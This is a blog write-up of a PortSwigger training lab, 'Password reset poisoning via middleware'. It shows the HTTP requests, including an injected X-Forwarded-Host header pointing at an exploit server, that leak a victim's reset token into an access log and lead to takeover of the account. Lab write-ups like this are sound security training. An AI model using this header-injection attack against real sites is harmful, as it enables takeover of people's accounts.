---
layout: post
title: "PortSwigger Lab: Password reset poisoning via middleware"
date: 2026-03-04
categories:
  [
    "PortSwigger",
    "Practice",
    "Authentication Vulnerabilities",
    "Vulnerabilities in other authentication mechanisms",
  ]
tags:
  - "PortSwigger"
  - "Authentication Vulnerabilities"
  - "Vulnerabilities in other authentication mechanisms"
  - "Password Reset"
  - "Burp Suite"
---

# PortSwigger Lab: Password reset poisoning via middleware

# Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools](#lab-setup-and-tools)
- [Solution Steps](#solution-steps)
- [What I'd Do Next (Blue Team)](#what-id-do-next)
- [Try This Lab Yourself](#try-this-lab-yourself)

---

# Overview / Goal {#overview--goal}

> This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. Any emails sent to this account can be read via the email client on the exploit server.
>
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`

So this is clearly about poisoning the reset link itself. If Carlos clicks whatever he receives, I just need his reset token.

That means: manipulate how the reset URL is generated.

# Lab Setup and Tools {#lab-setup-and-tools}

- Burp Suite + Firefox (through FoxyProxy)

---

# Solution Steps {#solution-steps}

**1) Observing Normal Reset Flow**

I logged in with my given credentials. Nothing unusual showed up in Burp.

Then I used the password reset feature for `wiener`.

The request:

```http
POST /forgot-password HTTP/2
Host: 0a8500920489321180dd035700610047.web-security-academy.net
Cookie: session=B5rjqgrYSblzekh2STCpTZvTTMjLGIwy
Origin: https://0a8500920489321180dd035700610047.web-security-academy.net
Referer: https://0a8500920489321180dd035700610047.web-security-academy.net/forgot-password

username=wiener
```

Then I checked the email client and clicked the reset link. The follow-up request looked like this:

```http
POST /forgot-password?temp-forgot-password-token=ao1qegegni9gx1j5k1v1sp6se4664knr HTTP/2

Host: 0a8500920489321180dd035700610047.web-security-academy.net
Cookie: session=B5rjqgrYSblzekh2STCpTZvTTMjLGIwy
Origin: https://0a8500920489321180dd035700610047.web-security-academy.net
Referer: https://0a8500920489321180dd035700610047.web-security-academy.net/forgot-password?temp-forgot-password-token=ao1qegegni9gx1j5k1v1sp6se4664knr

temp-forgot-password-token=ao1qegegni9gx1j5k1v1sp6se4664knr&new-password-1=peter&new-password-2=peter
```

So, if I can control the host used inside that email link, I can redirect Carlos to my server with his token.

**2) Testing for Host Header Injection via Middleware**

Since this lab name explicitly mentions middleware, I suspected the app might trust headers like:

`X-Forwarded-Host`

So I modified the reset request and targeted Carlos directly.

```http
POST /forgot-password HTTP/2
Host: 0a8500920489321180dd035700610047.web-security-academy.net
Cookie: session=B5rjqgrYSblzekh2STCpTZvTTMjLGIwy
Origin: https://0a8500920489321180dd035700610047.web-security-academy.net
Referer: https://0a8500920489321180dd035700610047.web-security-academy.net/forgot-password

X-Forwarded-Host: exploit-0a4100440484321b8077027901ff0018.exploit-server.net

username=carlos
```

If the backend uses `X-Forwarded-Host` when constructing absolute URLs in the reset email, then Carlos will receive a poisoned link pointing to my exploit server.

**3) Capturing Carlos's Token**

I checked the exploit server access log and saw:

```plaintext
10.0.4.50       2026-03-04 10:03:26 +0000 "GET /forgot-password?temp-forgot-password-token=jepx9txi01y18b0jgp69fb5v2le52dap HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

Carlos clicked the poisoned link.

And now I have his valid reset token:

`jepx9txi01y18b0jgp69fb5v2le52dap`

**4) Resetting Carlos's Password**

Now I simply submitted the reset request using his real token:

```http
POST /forgot-password?temp-forgot-password-token=jepx9txi01y18b0jgp69fb5v2le52dap HTTP/2
Host: 0a8500920489321180dd035700610047.web-security-academy.net

Cookie: session=B5rjqgrYSblzekh2STCpTZvTTMjLGIwy
Origin: https://0a8500920489321180dd035700610047.web-security-academy.net

Referer: https://0a8500920489321180dd035700610047.web-security-academy.net/forgot-password?temp-forgot-password-token=jepx9txi01y18b0jgp69fb5v2le52dap

temp-forgot-password-token=jepx9txi01y18b0jgp69fb5v2le52dap&new-password-1=peter&new-password-2=peter
```

The response I got was "Invalid token" But I found out that it doesn't matter.

I tried logging in with:

`carlos:peter`

And it worked!

Lab solved ✅

---

# What I'd Do Next (Blue Team) {#what-id-do-next}

- Never trust user-supplied headers for constructing absolute URLs in security-critical emails.
- Configure the proxy to strip or overwrite untrustworthy headers.
- Bind the password reset token to the intended user and a short expiration time.

---

# Try This Lab Yourself {#try-this-lab-yourself}

🔗 Lab Link: [PortSwigger Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware){:target="\_blank"}
